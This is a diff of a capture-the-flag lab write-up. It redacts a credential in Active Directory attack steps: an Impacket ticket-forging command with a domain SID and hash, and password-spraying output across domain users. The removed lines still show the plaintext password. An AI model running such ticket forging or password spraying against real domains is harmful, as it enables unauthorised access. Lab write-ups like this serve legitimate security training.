@@ -380,7 +380,7 @@ S-1-5-21-3976908837-939936849-1028625813-1609
 
 # So the --domain-sid is S-1-5-21-3976908837-939936849-1028625813
 
-ticketer.py -nthash 9cdc4501e630a30cc0eeef79f23a62dc -domain-sid S-1-5-21-3976908837-939936849-1028625813 -domain sidecar.vl -dc-ip 10.10.210.69 -spn HOST/WS01.mist.htb Administrator
+ticketer.py -nthash 9c[...]dc -domain-sid S-1-5-21-3976908837-939936849-1028625813 -domain sidecar.vl -dc-ip 10.10.210.69 -spn HOST/WS01.mist.htb Administrator
 Impacket v0.10.1.dev1+20220912.224808.5fcd5e81 - Copyright 2022 SecureAuth Corporation
 
 [*] Creating basic skeleton ticket and PAC Infos
@@ -407,13 +407,13 @@ Now we can crack the hash of "Deployer" with crackstation and it give to us pass
 ```bash
 cme smb 10.10.210.69 -u users.txt -p 'REDACTED' --continue-on-success
 SMB         10.10.210.69    445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:Sidecar.vl) (signing:True) (SMBv1:False)
-SMB         10.10.210.69    445    DC01             [-] Sidecar.vl\DC01$:Aces&Eights STATUS_LOGON_FAILURE
-SMB         10.10.210.69    445    DC01             [-] Sidecar.vl\A.Roberts:Aces&Eights STATUS_LOGON_FAILURE
-SMB         10.10.210.69    445    DC01             [-] Sidecar.vl\J.Chaffrey:Aces&Eights STATUS_LOGON_FAILURE
-SMB         10.10.210.69    445    DC01             [-] Sidecar.vl\O.osvald:Aces&Eights STATUS_LOGON_FAILURE
-SMB         10.10.210.69    445    DC01             [-] Sidecar.vl\P.robinson:Aces&Eights STATUS_LOGON_FAILURE
-SMB         10.10.210.69    445    DC01             [-] Sidecar.vl\M.smith:Aces&Eights STATUS_LOGON_FAILURE
-SMB         10.10.210.69    445    DC01             [-] Sidecar.vl\E.Klaymore:Aces&Eights STATUS_LOGON_FAILURE
+SMB         10.10.210.69    445    DC01             [-] Sidecar.vl\DC01$:REDACTED STATUS_LOGON_FAILURE
+SMB         10.10.210.69    445    DC01             [-] Sidecar.vl\A.Roberts:REDACTEDs STATUS_LOGON_FAILURE
+SMB         10.10.210.69    445    DC01             [-] Sidecar.vl\J.Chaffrey:REDACTED STATUS_LOGON_FAILURE
+SMB         10.10.210.69    445    DC01             [-] Sidecar.vl\O.osvald:REDACTED STATUS_LOGON_FAILURE
+SMB         10.10.210.69    445    DC01             [-] Sidecar.vl\P.robinson:REDACTED STATUS_LOGON_FAILURE
+SMB         10.10.210.69    445    DC01             [-] Sidecar.vl\M.smith:REDACTED STATUS_LOGON_FAILURE
+SMB         10.10.210.69    445    DC01             [-] Sidecar.vl\E.Klaymore:REDACTED STATUS_LOGON_FAILURE
 SMB         10.10.210.69    445    DC01             [+] Sidecar.vl\svc_deploy:REDACTED
 ```
 ## Exploit TcbPrivilege
